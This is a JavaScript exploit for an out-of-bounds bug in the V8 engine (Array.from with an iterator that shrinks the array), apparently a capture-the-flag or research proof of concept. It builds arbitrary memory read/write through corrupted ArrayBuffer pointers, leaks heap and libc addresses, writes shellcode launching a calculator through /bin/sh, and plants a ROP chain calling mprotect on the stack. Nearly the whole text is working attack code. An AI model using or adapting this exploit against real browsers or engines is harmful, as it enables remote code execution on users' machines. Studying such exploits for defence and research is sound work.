class ChangeType{
    constructor(){
        this.buf=new ArrayBuffer(8);
        this.f64=new Float64Array(this.buf);
        this.u32=new Uint32Array(this.buf);
    }
    f2i(val){
        this.f64[0]=val;
        return this.u32[1]*0x100000000+this.u32[0];
    }
    i2f(val){
        this.u32[0]=parseInt(val%0x100000000);
        this.u32[1]=parseInt((val-this.u32[0])/0x100000000);
        return this.f64[0];
    }

}
function hex(x)
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}
var ct=new ChangeType(); 

let oobArray = [1.1];  //float
let arrays=[];    
let objs=[];        //for leak                            
let maxSize = 1028 * 8;            //8224    

Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => ( 
  {
    counter : 0,
    next() {
      let result = 1.1;
    this.counter++;
      if (this.counter > maxSize) {         
     oobArray.length=1;    // !=0 void from be huishou by GC,Elements will point to a null pointer
    for(let i=0;i<100;i++)
    {
        let array=new ArrayBuffer(0x512);
        let obj={'a':0x1234,'b':0x5678};
        arrays.push(array);
        objs.push(obj);
        //%DebugPrint(array);    
    }        
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });

let backing_store;
let kbitfield;
let buf_index;
for(let i=0;i<=maxSize;i++){let x=oobArray[i]}; //GC


//find ArrayBuffer in the shot
for(let i=0;i<maxSize;i++)
{
    let val=ct.f2i(oobArray[i]);
    if(val===0x51200000000)
    {
        backing_store=i+1;
        kbitfield=backing_store+1;
        console.log("[*]find target ArrayBuffer in oobArray number ["+i+"]");
        oobArray[i]=ct.i2f(0xbeaf00000000);
        break;
    }
}

for(let i=0;i<100;i++)
{    
    //console.log(arrays[i].bytelength);
    if(arrays[i].byteLength===0xbeaf){

           console.log("[*]find target ArrayBuffer number ["+i+"]");
        buf_index=i;    
        let tmp=new Float64Array(arrays[buf_index],0,0x10);
        tmp[0]=ct.i2f(0xdeadbeef);
        break;
    }    
}

let obj_index;
let obj_offset;
//find Objects

for(let i=0;i<maxSize;i++)
{
    let val=ct.f2i(oobArray[i]);
    if(val===0x123400000000)
    {
        obj_offset=i;
        console.log("[*]find target objecets in oobArray number ["+i+"]");
        oobArray[i]=ct.i2f(0x123500000000);
        break;
    }
}

for(let i=0;i<100;i++)
{    
    if(objs[i].a===0x1235){
           console.log("[*]find target objs number ["+i+"]");
        obj_index=i;
        break;
    }    
}

class ArbitraryRW
{
    leak_obj(obj){
        objs[obj_index].a = obj;

        return ct.f2i(oobArray[obj_offset]) - 1;
    }
    read(addr){
        oobArray[backing_store]=ct.i2f(addr);
        oobArray[kbitfield]=ct.i2f(addr);
        //console.log(hex(addr));
        //console.log(hex(ct.f2i(oobArray[backing_store])));
        //console.log(hex(ct.f2i(oobArray[kbitfield])));
        let tmp=new Float64Array(arrays[buf_index],0,0x10);
        return ct.f2i(tmp[0]);
    }
    write(addr,value){
        oobArray[backing_store]=ct.i2f(addr);
        oobArray[kbitfield]=ct.i2f(addr);
        this.f64=new Float64Array(arrays[buf_index],0,0x10);
        this.f64[0]=ct.i2f(value);
    }
    leak(){
        return ct.f2i(oobArray[kbitfield]);
    }
}

let wr=new ArbitraryRW();

let heap=wr.leak()-0x10;
console.log("[*]leak backing store address="+hex(heap));

chunk=heap;
let size=wr.read(chunk+8);
size=parseInt(size/8)*8;
let finded=0;

for(let i=0;i<0x5000;i++)
{
    //let leak=wr.read(heap);
    prev_size=wr.read(chunk);
    size=wr.read(chunk+8);

    if(size !== 0 && size % 2 === 0 && prev_size <= 0x3f0)
    {
    let tmp_ptr=chunk-prev_size;
    fd=wr.read(tmp_ptr+0x10);
    bk=wr.read(tmp_ptr+0x18);
    console.log(hex(chunk)+"->"+hex(prev_size));
    if(parseInt(fd/0x10000000000)===0x7f)
    {
        console.log("[*]leak unsort bin(fd)");
        finded=fd;

        break;    
    }
    if(parseInt(bk/0x10000000000)===0x7f)
    {
        console.log("[*]leak unsort bin(bk)");
        console.log(hex(bk));
        break;    
    }
    }
    else if(size<0x20){break;}

    size=parseInt(size/8)*8;
    chunk+=size;
}
if(finded!==0)
{    
    libc_base=parseInt(finded/0x100)*0x100-0x3c3b00;
    console.log("libc_base="+hex(libc_base));
}
else{
    console.log("Error when leak libc base!Try Again.");
}

//PUSH SHELLCODE
let shellcode=new Uint8Array(4096);
let shellcode_addr=wr.leak_obj(shellcode);

ptr=wr.read(shellcode_addr+0x18)-1;
shellcode_addr=wr.read(ptr+0x20);
console.log(hex(shellcode_addr));
let sc=[0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,0x48,0x89,0xe7,0x68,0x2d,0x63,0x00,0x00,0x48,0x89,0xe6,0x52,0xe8,0x1c,0x00,0x00,0x00,0x44,0x49,0x53,0x50,0x4c,0x41,0x59,0x3d,0x3a,0x30,0x20,0x67,0x6e,0x6f,0x6d,0x65,0x2d,0x63,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72,0x00,0x56,0x57,0x48,0x89,0xe6,0x0f,0x05];
for(let i=0;i<sc.length;i++){
    shellcode[i]=sc[i];
}

//ROP
let pop_rdi=0x21102+libc_base;
let pop_rsi=0x202e8+libc_base;
let pop_rdx=0x01b92+libc_base;
let retn=0xe9bbb+libc_base;
let mprotect=0x100eb0+libc_base;
let rop=[
pop_rdi,
parseInt(shellcode_addr/0x1000)*0x1000,
pop_rsi,
1024,
pop_rdx,
7,
mprotect,
shellcode_addr
]

//GET STACK_ADDR
let environ_addr=libc_base+0x3c5f98;
let stack_addr=wr.read(environ_addr);
console.log("[*]stack address "+hex(stack_addr));

let rop_addr=stack_addr-200*rop.length;
console.log("[*]rop address "+hex(rop_addr))
for(let i=0;i<rop.length;i++)
{
    wr.write(rop_addr+i*8,rop[i]);
}
for(let i=1;i<10;i++)
{
    wr.write(rop_addr-i*8,retn);
}


//malloc hook
/*
malloc_hook=0x3C3B10+libc_base;
one_gadget=0xf0897+libc_base;
wr.write(malloc_hook,one_gadget);
*/


//oobArray[oobArray.length - 1] = 0x41414141;                //触发crash
